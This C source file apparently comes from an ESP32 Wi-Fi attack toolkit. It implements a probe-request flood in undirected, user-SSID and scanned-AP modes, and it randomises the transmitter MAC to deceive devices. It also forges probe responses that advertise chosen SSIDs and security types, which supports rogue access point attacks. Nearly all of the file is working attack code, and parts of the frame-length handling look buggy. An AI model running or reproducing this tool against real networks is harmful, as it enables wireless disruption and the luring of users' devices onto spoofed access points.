#include "probe.h"
#include "common.h"
#include "esp_err.h"
#include "gravity.h"
#include "mana.h" /* To import PRIVACY_ON_BYTES and PRIVACY_OFF_BYTES */


int PROBE_SSID_OFFSET = 26;
int PROBE_SRCADDR_OFFSET = 10;
int PROBE_DESTADDR_OFFSET = 4;
int PROBE_BSSID_OFFSET = 16;
int PROBE_SEQNUM_OFFSET = 22;
int PROBE_REQUEST_LEN = 42;

int PROBE_RESPONSE_DEST_ADDR_OFFSET = 4;
int PROBE_RESPONSE_SRC_ADDR_OFFSET = 10;
int PROBE_RESPONSE_BSSID_OFFSET = 16;
int PROBE_RESPONSE_PRIVACY_OFFSET = 34;
int PROBE_RESPONSE_SSID_OFFSET = 38;
int PROBE_RESPONSE_GROUP_CIPHER_OFFSET = 62; /* + ssid_len */
int PROBE_RESPONSE_PAIRWISE_CIPHER_OFFSET = 68; /* + ssid_len */
int PROBE_RESPONSE_AUTH_TYPE_OFFSET = 74; /* + ssid_len */
int PROBE_RESPONSE_LEN = 173;


uint8_t probe_raw[] = {
    /*IEEE 802.11 Probe Request*/
	0x40, 0x00, //Frame Control version=0 type=0(management)  subtype=100 (probe request)
	0x00, 0x00, //Duration
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //A1 Destination address  broadcast
	0x50, 0x02, 0x91, 0x90, 0x0c, 0x70, //A2 Source address (STA Mac i.e. transmitter address)
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //A3 BSSID
	0x30, 0x9e, //sequence number (This would be overwritten if 'en_sys_seq' is set to true in fn call esp_wifi_80211_tx )

	/*IEEE 802.11 Wireless Management*/
	/*Tagged Paramneters*/
	/*Tag: SSID parameter set: Wildcard SSID*/
	0x00,	//ssid.element_id
	0x00,	//ssid.length
                //ssid.name

	/*Tag: Supported Rates 5.5(B), 11(B), 1(B), 2(B), 6, 12, 24, 48, [Mbit/sec]*/
	0x01,	//wlan.tag.number => 1
	0x08,	//wlan.tag.length => 8
	0x8b,	//Supported Rates: 5.5(B) (0x8b)	(wlan.supported_rates)
	0x96,	//Supported Rates: 11(B) (0x96)		(wlan.supported_rates)
	0x82,	//Supported Rates: 1(B) (0x82)		(wlan.supported_rates)
	0x84,	//Supported Rates: 2(B) (0x84)		(wlan.supported_rates)
	0x0c,	//Supported Rates: 6 (0x0c)			(wlan.supported_rates)
	0x18,	//Supported Rates: 12 (018)			(wlan.supported_rates)
	0x30,	//Supported Rates: 24 (0x30)		(wlan.supported_rates)
	0x60,	//Supported Rates: 48 (0x60)		(wlan.supported_rates)

	/*Tag: Extended Supported Rates 54, 9, 18, 36, [Mbit/sec]*/

	0x32,	//wlan.tag.number => 50
	0x04,	//wlan.tag.length => 4
	0x6c,	//Extended Supported Rates: 54 (0x6c)	(wlan.extended_supported_rates)
	0x12,	//Extended Supported Rates: 9 (0x12)	(wlan.extended_supported_rates
	0x24,	//Extended Supported Rates: 18 (0x24)	(wlan.extended_supported_rates
	0x48,	//Extended Supported Rates: 36 (0x48)	(wlan.extended_supported_rates

	/*ACTUAL 0x88 0x7d 0x42 0xd4   0x83, 0x2d, 0xbe, 0xce*/ //Frame check sequence: 0x1b8026b0 [unverified] (wlan.fcs)
};

uint8_t probe_response_raw[] = {
    0x50, 0x00, 0x3c, 0x00, 
    0x08, 0x5a, 0x11, 0xf9, 0x23, 0x3d,       // destination address
    0x20, 0xe8, 0x82, 0xee, 0xd7, 0xd5, // source address
    0x20, 0xe8, 0x82, 0xee, 0xd7, 0xd5, // BSSID
    0xc0, 0x72,                         // Fragment number 0 seq number 1836
    0xa3, 0x52, 0x5b, 0x8d, 0xd2, 0x00, 0x00, 0x00, 0x64, 0x00,
    0x11, 0x11, // 802.11 Privacy Capability, 0x1101 == no. 0x11 0x11 == yes
                          /* Otherwise AND existing bytes with 0b11101111 */
    0x00, 0x08, // Parameter Set (0), SSID Length (8)
                          // To fill: SSID
    0x01, 0x08, 0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c, 0x20, 0x01, 0x00, 0x23, 0x02, 0x14,
    0x00, 0x30, 0x14, 0x01, 0x00,
    0x00, 0x0f, 0xac,       /* Group cipher suite OUI */
    0x04,                             /* Group cipher suite type: AES */
    0x01, 0x00,                  /* Pairwise cipher suite count */
    0x00, 0x0f, 0xac,       /* Pairwise cipher suite OUI */
    0x04,                             /* Pairwise cipher suite type: AES */
    0x01, 0x00,                  /* Auth key management suite count */
    0x00, 0x0f, 0xac,       /* Auth key management OUI */
    0x02,                             /* Auth key management type: PSK */
    0x0c, 0x00, 0x46, 0x05, 0x32, 0x08, 0x01, 0x00, 0x00, 0x2d, 0x1a, 0xef, 0x08, 0x17, 0xff, 0xff,
    0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x3d, 0x16, 0x95, 0x0d, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7f, 0x08, 0x04,
    0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x40, 0xbf, 0x0c, 0xb2, 0x58, 0x82, 0x0f, 0xea, 0xff, 0x00,
    0x00, 0xea, 0xff, 0x00, 0x00, 0xc0, 0x05, 0x01, 0x9b, 0x00, 0x00, 0x00, 0xc3, 0x04, 0x02, 0x02,
    0x02, 0x02,
    /* 0x71, 0xb5, 0x92, 0x42 // Frame check sequence */
};

static probe_attack_t attackType = ATTACK_PROBE_NONE;
TaskHandle_t probeTask = NULL;

/* Our list of SSIDs */
char **probeList = NULL;
int probeListCount = 0;

void probeCallback(void *pvParameter) {
    /* For directed probes we need to track which SSID we're up to */
    static int ssid_idx = 0;
    int curr_ssid_len;
    /* Move the packet off the heap */
    uint8_t *probeBuffer;

    #ifdef CONFIG_FLIPPER
        printf("Random MAC: %s\n", (attack_status[ATTACK_RANDOMISE_MAC])?"ON":"OFF");
    #else
        ESP_LOGI(PROBE_TAG, "Randomise MAC is %s\n",(attack_status[ATTACK_RANDOMISE_MAC])?"ON":"OFF");
    #endif

    while (true) {
        vTaskDelay(ATTACK_MILLIS / portTICK_PERIOD_MS);

        // Create a buffer large enough to store packet + SSID etc.
        probeBuffer = malloc(sizeof(uint8_t) * 1024);
        if (probeBuffer == NULL) {
            ESP_LOGE(PROBE_TAG, "Failed to allocate memory to construct a probe request");
            return;
        }

        // Build beginning of packet
        memcpy(probeBuffer, probe_raw, PROBE_SSID_OFFSET - 1);
        // Broadcast or directed packet?
        if (attackType == ATTACK_PROBE_UNDIRECTED) {
            // Append SSID length of 0
            probeBuffer[PROBE_SSID_OFFSET - 1] = 0;
            curr_ssid_len = 0;
        } else {
            // Find the length of the SSID at ssid_idx
            // The trailing \0 in the SSID string is being ignored because
            //   the null is not included in the packet.
            curr_ssid_len = strlen(probeList[ssid_idx]);
            probeBuffer[PROBE_SSID_OFFSET - 1] = curr_ssid_len;
            memcpy(&probeBuffer[PROBE_SSID_OFFSET], probeList[ssid_idx], curr_ssid_len);
        }
        // Append the rest, beginning from probe_raw[PROBE_SSID_OFFSET] with
        //   length sizeof(probe_raw)-PROBE_SSID_OFFSET, to
        //   probeBuffer[PROBE_SSID_OFFSET + curr_ssid_len]
        memcpy(&probeBuffer[PROBE_SSID_OFFSET + curr_ssid_len], &probe_raw[PROBE_SSID_OFFSET], sizeof(probe_raw) - PROBE_SSID_OFFSET);
        // probeBuffer is now the right size, but needs some attributes set
        // TODO: Either use configured MAC or use random MAC
        int addr;
        if (attack_status[ATTACK_RANDOMISE_MAC]) {
            // Generate a new MAC
            // Randomise the 3 least significant bytes of the source MAC
            for (int offset = PROBE_SRCADDR_OFFSET + 3; offset < PROBE_SRCADDR_OFFSET + 6; ++offset) {
                addr = rand() % 256;
                probeBuffer[offset] = addr;
            }
            char newMac[18];
            mac_bytes_to_string(&probeBuffer[PROBE_SRCADDR_OFFSET], newMac);
            // Also set device MAC here to fool devices
            esp_err_t err = esp_wifi_set_mac(WIFI_IF_AP, &probeBuffer[PROBE_SRCADDR_OFFSET]);
            if (err != ESP_OK) {
                ESP_LOGW(PROBE_TAG, "Failed to set MAC: %s. Using default MAC", esp_err_to_name(err));
            }
            vTaskDelay(1);
        } else {
            // Get device MAC and use it
            uint8_t bMac[6];
            esp_err_t err = esp_wifi_get_mac(WIFI_IF_AP, bMac);
            if (err != ESP_OK) {
                ESP_LOGW(PROBE_TAG, "Failed to get MAC: %s. Using default MAC", esp_err_to_name(err));
            }
            char strMac[18];
            ESP_ERROR_CHECK(mac_bytes_to_string(bMac, strMac));

            // TODO: The following line was commented out during initial testing. Test!
            memcpy(&probeBuffer[PROBE_SRCADDR_OFFSET], bMac, 6);
        }

        // Use MAC/srcAddr for BSSID
        for (addr = 0; addr < 6; ++addr) {
            probeBuffer[PROBE_BSSID_OFFSET + addr] = probeBuffer[PROBE_SRCADDR_OFFSET + addr];
        }

        // transmit
        esp_wifi_80211_tx(WIFI_IF_AP, probeBuffer, sizeof(probe_raw) + curr_ssid_len, true);
        // increment ssid
        ++ssid_idx;
        if (ssid_idx >= probeListCount) {
            ssid_idx = 0;
        }
        free(probeBuffer);
    }
}

int probe_stop() {
    #ifdef CONFIG_DEBUG
        ESP_LOGI(PROBE_TAG, "Trace: probe_stop()");
    #endif
    if (probeTask != NULL) {
        #ifdef CONFIG_FLIPPER
            printf("Killing old probe...\n");
        #else
            ESP_LOGI(PROBE_TAG, "Found a probe task, killing %p", probeTask);
        #endif
        vTaskDelete(probeTask);
        probeTask = NULL;
    }

    if (attackType == ATTACK_PROBE_DIRECTED_SCAN) {
        /* Need to clear probeList and its contents */
        for (int i = 0; i < probeListCount; ++i) {
            free(probeList[i]);
        }
        free(probeList);
    }
    attackType = ATTACK_PROBE_NONE;
    return ESP_OK;
}

int probe_start(probe_attack_t type) {
    srand(time(NULL));

    // Stop the existing probe attack if there is one
    if (attackType != ATTACK_PROBE_NONE) {
        #ifdef CONFIG_FLIPPER
            printf("End %sdirected probe\n", (attackType == ATTACK_PROBE_UNDIRECTED)?"un":"");
        #else
            ESP_LOGI(PROBE_TAG, "Halting existing %sdirected probe...", (attackType==ATTACK_PROBE_UNDIRECTED)?"un-":"");
        #endif
        probe_stop();
    }
    attackType = type;

    /* Set our list of probes for directed attacks */
    if (attackType == ATTACK_PROBE_DIRECTED_USER) {
        probeList = user_ssids;
        probeListCount = user_ssid_count;
    } else if (attackType == ATTACK_PROBE_DIRECTED_SCAN) {
        probeList = apListToStrings(gravity_selected_aps, gravity_sel_ap_count);
        probeListCount = gravity_sel_ap_count;
    }

    // The two variations on this attack - directed vs. undirected
    //   probes - have so much similarity that the differences will be
    //   dealt with in lower level functions
    xTaskCreate(&probeCallback, "probeCallback", 2048, NULL, 5, &probeTask);
    return ESP_OK;
}

/* seqNum == 0 to let IDF handle seq num */
esp_err_t send_probe_response(uint8_t *srcAddr, uint8_t *destAddr, char *ssid, enum PROBE_RESPONSE_AUTH_TYPE authType, uint16_t seqNum) {
    uint8_t *probeBuffer;

    #ifdef CONFIG_DEBUG_VERBOSE
        printf("send_probe_response(): ");
        char strSrcAddr[18];
        char strDestAddr[18];
        char strAuthType[15];
        mac_bytes_to_string(srcAddr, strSrcAddr);
        mac_bytes_to_string(destAddr, strDestAddr);
        switch (authType) {
        case AUTH_TYPE_NONE:
            strcpy(strAuthType, "AUTH_TYPE_NONE");
            break;
        case AUTH_TYPE_WEP:
            strcpy(strAuthType, "AUTH_TYPE_WEP");
            break;
        case AUTH_TYPE_WPA:
            strcpy(strAuthType, "AUTH_TYPE_WPA");
            break;
        }
        printf("srcAddr: %s\tdestAddr: %s\tSSID: \"%s\"\tauthType: %s\n", strSrcAddr, strDestAddr, ssid, strAuthType);
    #endif

    probeBuffer = malloc(sizeof(uint8_t) * 208);
    if (probeBuffer == NULL) {
        ESP_LOGE(PROBE_TAG, "Failed to register probeBuffer on the stack");
        return ESP_ERR_NO_MEM;
    }
    /* Copy bytes to SSID (correct src/dest later) */
    memcpy(probeBuffer, probe_response_raw, PROBE_RESPONSE_SSID_OFFSET - 1);
    /* Replace SSID length and append SSID */
    probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1] = strlen(ssid);
    //memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], ssid, strlen(ssid));
    memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], ssid, sizeof(char) * strlen(ssid));
    /* Append the remainder of the packet */
    memcpy(&probeBuffer[PROBE_RESPONSE_SSID_OFFSET + strlen(ssid)], &probe_response_raw[PROBE_RESPONSE_SSID_OFFSET], PROBE_REQUEST_LEN - PROBE_RESPONSE_SSID_OFFSET);
    
    /* Set source and dest MACs */
    memcpy(&probeBuffer[PROBE_RESPONSE_SRC_ADDR_OFFSET], srcAddr, 6);
    memcpy(&probeBuffer[PROBE_RESPONSE_BSSID_OFFSET], srcAddr, 6);
    memcpy(&probeBuffer[PROBE_RESPONSE_DEST_ADDR_OFFSET], destAddr, 6);

    /* Set authentication method */
    uint8_t *bAuthType = NULL;
    switch (authType) {
    case AUTH_TYPE_NONE:
        bAuthType = PRIVACY_OFF_BYTES;
        probeBuffer[PROBE_RESPONSE_AUTH_TYPE_OFFSET + probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1]] = 0x00;
        break;
    case AUTH_TYPE_WEP:
        bAuthType = PRIVACY_ON_BYTES;
        probeBuffer[PROBE_RESPONSE_AUTH_TYPE_OFFSET + probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1]] = 0x01;
        break;
    case AUTH_TYPE_WPA:
        bAuthType = PRIVACY_ON_BYTES;
        probeBuffer[PROBE_RESPONSE_AUTH_TYPE_OFFSET + probeBuffer[PROBE_RESPONSE_SSID_OFFSET - 1]] = 0x02;
        break;
    default:
        ESP_LOGE(PROBE_TAG, "Unrecognised authentication type: %d\n", authType);
        return ESP_ERR_INVALID_ARG;
    }
    memcpy(&probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], bAuthType, 2);

    /* Decode, increment and recode seqNum */
    bool sys_queue = false;
    if (seqNum == 0) {
        sys_queue = true;
    } else {
        uint16_t seq = seqNum >> 4;
        ++seq;
        uint16_t newSeq = seq << 4 | (seq & 0x000f);
        uint8_t finalSeqNum[2];
        finalSeqNum[0] = (newSeq & 0x00FF);
        finalSeqNum[1] = (newSeq & 0xFF00) >> 8;
        memcpy(&probeBuffer[PROBE_SEQNUM_OFFSET], finalSeqNum, 2);
    }

    #ifdef CONFIG_DEBUG_VERBOSE
        char debugOut[1024];
        int debugLen=0;
        strcpy(debugOut, "SSID: \"");
        debugLen += strlen("SSID: \"");
        strncpy(&debugOut[debugLen], (char*)&probeBuffer[PROBE_RESPONSE_SSID_OFFSET], probeBuffer[PROBE_RESPONSE_SSID_OFFSET-1]);
        debugLen += probeBuffer[PROBE_RESPONSE_SSID_OFFSET-1];
        sprintf(&debugOut[debugLen], "\"\tsrcAddr: ");
        debugLen += strlen("\"\tsrcAddr: ");
        char strMac[18];
        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_SRC_ADDR_OFFSET], strMac);
        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
        debugLen += strlen(strMac);
        sprintf(&debugOut[debugLen], "\tBSSID: ");
        debugLen += strlen("\tBSSID: ");
        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_BSSID_OFFSET], strMac);
        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
        debugLen += strlen(strMac);
        sprintf(&debugOut[debugLen], "\tdestAddr: ");
        debugLen += strlen("\tdestAddr: ");
        mac_bytes_to_string(&probeBuffer[PROBE_RESPONSE_DEST_ADDR_OFFSET], strMac);
        strncpy(&debugOut[debugLen], strMac, strlen(strMac));
        debugLen += strlen(strMac);
        sprintf(&debugOut[debugLen], "\tAuthType: \"0x%02x 0x%02x\"", probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET], probeBuffer[PROBE_RESPONSE_PRIVACY_OFFSET+1]);
        debugLen += strlen("\tAuthType: \"0x 0x\"\n") + 4;
        sprintf(&debugOut[debugLen], "\tSeqNum: \"0x%02x 0x%02x\"\n", probeBuffer[PROBE_SEQNUM_OFFSET], probeBuffer[PROBE_SEQNUM_OFFSET+1]);
        debugLen += strlen("\tSeqNum: \"0x 0x\"\n") + 4;
        debugOut[debugLen] = '\0';
        printf("About to transmit %s\n", debugOut);
    #endif

    // Send the frame
    /* Pause for ATTACK_MILLIS first */
    vTaskDelay((ATTACK_MILLIS / portTICK_PERIOD_MS) + 1);
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, probeBuffer, PROBE_REQUEST_LEN + strlen(ssid), sys_queue);
    free(probeBuffer);
    return e;
}

/* Display information on the current status of the Probe Flood feature
   When active, also displays information on destination MACs
*/
esp_err_t display_probe_status() {
    esp_err_t err = ESP_OK;
    
    #ifdef CONFIG_FLIPPER
        printf("Probe Flood Attack: %s\n", (attack_status[ATTACK_PROBE])?"ON":"OFF");
    #else
        ESP_LOGI(PROBE_TAG, "Probe Flood Attack: %sRunning", (attack_status[ATTACK_PROBE])?"":"Not ");
    #endif

    switch (attackType) {
        case ATTACK_PROBE_DIRECTED_SCAN:
            #ifdef CONFIG_FLIPPER
                printf("Mode: Probe Requests for selected APs\n");
            #else
                ESP_LOGI(PROBE_TAG, "Mode: Transmitting Probe Requests for selected APs");
            #endif
            break;
        case ATTACK_PROBE_DIRECTED_USER:
            #ifdef CONFIG_FLIPPER
                printf("Mode: Probe Requests for Target-SSIDs\n");
            #else
                ESP_LOGI(PROBE_TAG, "Mode: Transmitting Probe Requests for Target-SSIDs");
            #endif
            break;
        case ATTACK_PROBE_UNDIRECTED:
            #ifdef CONFIG_FLIPPER
                printf("Mode: Probe Requests for Wildcard SSIDs\n");
            #else
                ESP_LOGI(PROBE_TAG, "Mode: Transmitting Probe Requests for Wildcard SSIDs");
            #endif
            break;
        case ATTACK_PROBE_NONE:
            #ifdef CONFIG_FLIPPER
                printf("Mode: None\n");
            #else
                ESP_LOGI(PROBE_TAG, "Mode: None");
            #endif
            break;
        default:
            #ifdef CONFIG_FLIPPER
                printf("Invalid Probe Flood Mode (%d)\n", attackType);
            #else
                ESP_LOGE(PROBE_TAG, "Invalid Probe Flood Mode (%d)", attackType);
            #endif
            return ESP_ERR_INVALID_ARG;
    }

    return err;
}